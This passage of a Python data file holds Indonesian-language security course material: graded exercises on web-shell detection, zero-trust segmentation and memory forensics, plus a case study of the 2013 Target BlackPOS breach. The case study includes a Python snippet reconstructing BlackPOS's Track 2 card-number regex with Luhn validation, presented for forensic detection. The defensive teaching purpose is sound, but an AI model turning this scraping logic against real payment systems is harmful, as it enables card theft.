  - Skor 50%: Menghitung jumlah gagal total tanpa membatasi jendela waktu (menghukum pengguna yang salah ketik beberapa kali dalam sebulan).
  - Skor 0%: Program gagal mem-parsing format timestamp log.

### Tingkat 2: Menengah
- **Tugas**: Bangun agen deteksi ancaman endpoint mikro (Mini-EDR Agent) dalam Python/C yang memantau pembuatan proses baru secara real-time via Linux `/proc` filesystem atau Netlink Socket, memeriksa garis keturunan pohon proses (*Process Ancestry / Parent-Child Relationship*), dan memicu peringatan jika proses shell (`/bin/sh`, `bash`, `powershell`) dijalankan oleh server web (`nginx`, `apache2`, `php-fpm`).
- **Petunjuk Perancangan Arsitektur**:
  - Pantau pembuatan proses via Netlink `PROC_EVENT_EXEC` atau polling berkala `/proc/[pid]/stat`.
  - Baca field `ppid` (Parent PID) dan cocokkan nama proses induk di `/proc/[ppid]/comm`.
  - Jika `comm` induk adalah server web dan anak adalah shell: tandai sebagai *Web Shell Execution Attempt*.
- **Test Vector & Kasus Uji**:
  - Skenario A: Pengguna terminal normal mengetik `bash` di SSH -> Status NORMAL (Induk: `sshd`).
  - Skenario B: Skrip pengujian menyimulasikan proses bernama `nginx` memanggil `sh -c id` -> Agen mencetak "HIGH ALERT: Web Shell Activity Detected from Parent nginx!".
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Deteksi relasi parent-child akurat tanpa false positive pada eksekusi normal, latensi deteksi $< 100\text{ ms}$.
  - Skor 50%: Deteksi bekerja namun menggunakan scanning `/proc` berat yang memakan beban CPU berlebihan.
  - Skor 0%: Hanya mengecek nama proses anak tanpa memvalidasi proses induk.

### Tingkat 3: Mahir
- **Tugas**: Rancang arsitektur segmentasi jaringan Zero-Trust Software-Defined Perimeter (SDP) dalam konfigurasi skrip deklaratif: Tulis aturan kebijakan mTLS (Mutual TLS) dan eBPF packet filter yang mengisolasi database backend agar hanya menerima koneksi TCP terenkripsi dari pod aplikasi mikro yang memiliki sertifikat identitas SPIFFE/SPIRE yang valid, menolak secara mutlak seluruh koneksi langsung dari subnet jaringan lain.
- **Petunjuk Perancangan Arsitektur**:
  - Implementasikan program eBPF tipe `BPF_PROG_TYPE_SOCK_OPS` atau skrip iptables/nftables canggih.
  - Lakukan verifikasi sertifikat mTLS X.509 pada layer aplikasi dengan validasi identitas SAN: `spiffe://cluster.local/ns/prod/sa/order-service`.
  - Tulis skrip verifikasi otomatis yang menguji koneksi dari pod sah vs pod penyusup di jaringan yang sama.
- **Test Vector & Kasus Uji**:
  - Uji pod `order-service` dengan sertifikat mTLS valid: Koneksi ke DB berhasil (HTTP 200 / SQL OK).
  - Uji pod lain pada namespace yang sama mencoba koneksi telnet/tcp langsung ke port DB: Paket di-drop pada level socket kernel sebelum jabat tangan TCP selesai.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Penegakan Zero-Trust ketat di tingkat kernel/jaringan, validasi SPIFFE ID presisi, kebal terhadap pergerakan lateral lateral movement.
  - Skor 50%: Verifikasi bekerja di level aplikasi mTLS namun port jaringan masih terbuka untuk port scanning mentah.
  - Skor 0%: Sertifikat klien tidak divalidasi identitasnya."""
    },
    182: {
        "trace": r"""#### Tabel Penelusuran Forensik Memori RAM Malware BlackPOS pada Pembobolan Target
| Langkah / Putaran Kripto / Tahap Eksploit | Komponen / Lapisan Memori | Payload / Ciphertext / Input Eksploit | Transformasi Matematis / Mutasi Stack & Heap | Status Register (RIP/RSP/Canary) / S-Box State | Keluaran / Status Keamanan / Efek Eksploit |
|---|---|---|---|---|---|
| 1. Kompromi Akses Pihak Ketiga | VPN Portal Vendor Fazio HVAC | Kredensial staf pendingin dicuri via phishing | Otentikasi VPN tanpa Multi-Factor Authentication (MFA) | Sesi VPN eksternal terbuka ke intranet Target | Penyerang menembus perimeter jaringan eksternal |
| 2. Pergerakan Lateral ke POS | Jaringan Kasir Kasir Toko | Penyebaran malware via admin share internal | Ketiadaan segmentasi jaringan antara sistem kantor & POS | Hak akses admin lokal disalahgunakan | Malware BlackPOS terinstal di ribuan mesin kasir fisik |
| 3. Injeksi & Pengait Memori | Memori Proses Kasir `pos.exe` | Thread scraper memori latar belakang | Panggilan API `OpenProcess` dan `VirtualQueryEx` | Register proses kasir membaca memori heap & stack | Memori proses kasir dipindai setiap beberapa milidetik |
| 4. Scraping Data Track 2 Kartu | Memori RAM Volatil Kasir | Gesekan kartu kredit magnetik nasabah | Regex pencarian pola pita magnetik: `([0-9]{15,16})[=D]([0-9]{4})` | String plaintext nomor kartu dan CVV ditemukan di RAM | Data kartu kredit dicuri sebelum sempat dienkripsi! |
| 5. Eksfiltrasi & Penjualan Gelap | Server Internal Target $\to$ C2 | Berkas teks dump kartu kredit | Pengiriman data terkompresi ke server di Rusia via FTP | Port FTP terbuka tanpa inspeksi lalu lintas keluar | 40 juta nomor kartu kredit dan 70 juta data pribadi bocor! |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Pembobolan 40 Juta Data Kartu Kredit Target via Malware RAM Scraper BlackPOS (2013)",
            "chronology": r"""- **Kronologi & Konteks Sejarah**: Selama musim belanja liburan November hingga Desember 2013, peretas membobol jaringan raksasa ritel AS Target, mencuri lebih dari 40 juta nomor kartu kredit dan debit serta 70 juta data informasi pribadi pelanggan. Insiden ini berujung pada pengunduran diri CEO dan CIO Target, serta total biaya kerugian dan penyelesaian hukum yang melampaui $290 Juta.
- **Akar Masalah Rekayasa Keamanan & Forensik Memori**: Penyerang awalnya memperoleh akses ke jaringan Target menggunakan kredensial vendor eksternal sistem pendingin udara (HVAC), Fazio Mechanical Services, yang dicuri melalui serangan email phishing. Karena tidak adanya segmentasi jaringan antara sistem kontraktor dan jaringan pembayaran, peretas dengan leluasa melakukan pergerakan lateral ke mesin kasir Point-of-Sale (POS) di toko-toko fisik. Di mesin kasir, peretas memasang malware pembaca memori RAM bernama BlackPOS (Kaptoxa). Terminal kasir saat itu belum menerapkan enkripsi ujung-ke-ujung (*Point-to-Point Encryption / P2PE*); ketika kartu digesek, nomor akun utama (PAN) dan data Track 2 magnetik sempat berada dalam bentuk teks polos (*plaintext*) di dalam memori RAM proses kasir selama sepersekian detik sebelum didelegasikan ke modul otorisasi. BlackPOS memindai memori proses menggunakan ekspresi reguler dan mengekstrak nomor kartu secara massal langsung dari RAM volatil.""",
            "snippet": r"""```python
# Analisis Forensik Memori: Rekonstruksi Regex Scraping Data Track 2 BlackPOS
import re

def forensic_memory_dump_analysis(raw_memory_bytes):
    '''
    Simulasi deteksi artefak pencurian nomor kartu kredit Track 2
    pada berkas dump memori RAM proses POS kasir.
    '''
    # Pola Regex Standar Industri yang dieksploitasi oleh Malware BlackPOS:
    # Format Track 2: [PAN 15-16 digit] = [Masa Berlaku YYMM 4 digit] [Service Code 3 digit] [Discretionary Data]
    track2_pattern = re.compile(rb"([0-9]{15,16})[=D]([0-9]{4})([0-9]{3})([0-9]*)")
    
    stolen_cards = []
    for match in track2_pattern.finditer(raw_memory_bytes):
        pan = match.group(1).decode('ascii', errors='ignore')
        expiry = match.group(2).decode('ascii', errors='ignore')
        
        # Algoritma Luhn Checksum Validation untuk memastikan nomor kartu sah
        if luhn_checksum_validate(pan):
            stolen_cards.append({
                "pan": pan[:6] + "******" + pan[-4:], # Masking untuk laporan forensik
                "expiry_yymm": expiry,
                "memory_offset": hex(match.start())
            })
            
    return stolen_cards

def luhn_checksum_validate(card_number_str):
    digits = [int(d) for d in card_number_str]
    checksum = 0
    reverse_digits = digits[::-1]
    for i, d in enumerate(reverse_digits):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return (checksum % 10 == 0)
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Pembobolan Target menjadi katalisator transformasi keamanan perbankan global: (1) Percepatan migrasi kartu pita magnetik ke teknologi chip aman **EMV (Europay, Mastercard, Visa)** yang menghasilkan kode otorisasi dinamis sekali pakai; (2) Penerapan wajib arsitektur **P2PE (Point-to-Point Encryption)** standar PCI-DSS, di mana pembaca kartu langsung mengenkripsi data pada level perangkat keras sirkuit sebelum data tersebut masuk ke bus atau memori komputer kasir; (3) Prosedur forensik insiden (*Digital Forensics and Incident Response / DFIR*) modern mewajibkan akuisisi memori RAM volatil lengkap (*Live Memory Dump*) menggunakan perangkat seperti LiME atau WinPmem sebelum sistem dimatikan, guna mengamankan artefak malware yang tidak pernah tersimpan di hard disk."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Tulis skrip investigasi forensik digital dalam Python yang membaca berkas citra disk mentah (atau direktori berkas bukti), menghitung nilai hash kriptografis SHA-256 dari seluruh berkas secara rekursif, dan menghasilkan dokumen rantai bukti (*Chain of Custody Manifest*) terverifikasi dengan timestamp ISO-8601.
- **Petunjuk Perancangan Arsitektur**:
  - Gunakan pembacaan file streaming dalam potongan blok 64 KB untuk menghemat memori saat memproses file besar.
  - Simpan manifes dalam format JSON yang memuat: `file_path`, `file_size_bytes`, `sha256_hash`, `calculated_at_utc`.
- **Test Vector & Kasus Uji**:
  - Berikan direktori bukti uji: Verifikasi bahwa jika satu byte berkas diubah, hash SHA-256 pada manifes berubah total dan skrip verifikator menandai berkas sebagai `EVIDENCE_TAMPERED`.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Perhitungan hash streaming efisien, format manifes rantai bukti standar forensik, deteksi integritas akurat.
  - Skor 50%: Membaca seluruh berkas ke dalam memori sekaligus (`f.read()`), crash pada berkas citra disk berukuran gigabyte.
  - Skor 0%: Menggunakan fungsi hash tidak aman (MD5) tanpa SHA-256.

### Tingkat 2: Menengah
- **Tugas**: Bangun parser log forensik Windows Event Log (`.evtx`) atau Linux `auditd` dalam Python yang mampu mendeteksi indikator aktivitas lateral movement penyerang: penciptaan layanan Windows baru (Event ID 7045), pembersihan log audit keamanan (Event ID 1102), dan aktivitas log masuk mencurigakan di luar jam operasional.
- **Petunjuk Perancangan Arsitektur**:
  - Parse struktur XML event menggunakan `xml.etree.ElementTree` atau modul `python-evtx`.
  - Ekstrak field penting: `EventID`, `TimeCreated`, `SubjectUserName`, `TargetUserName`, `ServiceName`.
  - Bangun aturan korelasi: jika Event ID 1102 terdeteksi, naikkan prioritas insiden ke `CRITICAL: AUDIT LOG PURGE DETECTED`.
- **Test Vector & Kasus Uji**:
  - Berikan berkas log sampel yang memuat rekaman eksekusi PsExec dan pembersihan log.
  - Parser harus menghasilkan ringkasan insiden dengan timeline kronologis dan daftar akun yang terlibat.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Parsing XML evtx cepat, aturan deteksi event ID kritis akurat, output linimasa kronologis jelas.
  - Skor 50%: Berhasil membaca event log namun tidak mampu merekonstruksi urutan kronologis antar event.
  - Skor 0%: Program gagal mem-parsing format biner evtx.

### Tingkat 3: Mahir
- **Tugas**: Rancang plugin analisis memori forensik mini (kompatibel dengan arsitektur Volatility 3) dalam Python: Plugin mem-parsing struktur internal pool alokasi kernel atau daftar berkas yang dipetakan dalam memori (`vad_tree` / Virtual Address Descriptors) untuk mengidentifikasi segmen memori proses yang memiliki atribut proteksi ganda `PAGE_EXECUTE_READWRITE` (RWX), mengekstrak dump biner dari segmen tersebut, dan memindai signature shellcode/YARA secara otomatis.
- **Petunjuk Perancangan Arsitektur**:
  - Baca representasi pohon biner VAD pada struktur `EPROCESS` Windows atau `vm_area_struct` Linux.
  - Identifikasi segmen memori dengan proteksi `RWX` (anomali yang sering digunakan oleh injektor shellcode dan unpacker malware).
  - Ekstrak byte dari rentang virtual memory tersebut dan jalankan pencocokan signature pola YARA.
- **Test Vector & Kasus Uji**:
  - Uji berkas memori dump proses yang disuntikkan shellcode metasploit: Plugin harus mendeteksi rentang memori RWX (misal `0x00400000 - 0x00403000`), mencatat offset-nya, dan mengekspor berkas dump biner yang memuat shellcode tersebut.
- **Rubrik Penilaian Objektif**:
  - Skor 100%: Pemetaan pohon VAD memori presisi, deteksi segment RWX akurat, integrasi scanner signature otomatis.
  - Skor 50%: Mampu mendeteksi segmen RWX namun gagal mengekstrak dump biner dari memori virtual.
  - Skor 0%: Mengandalkan pembacaan string linear tanpa memahami struktur struktur kernel VAD."""
    }
}
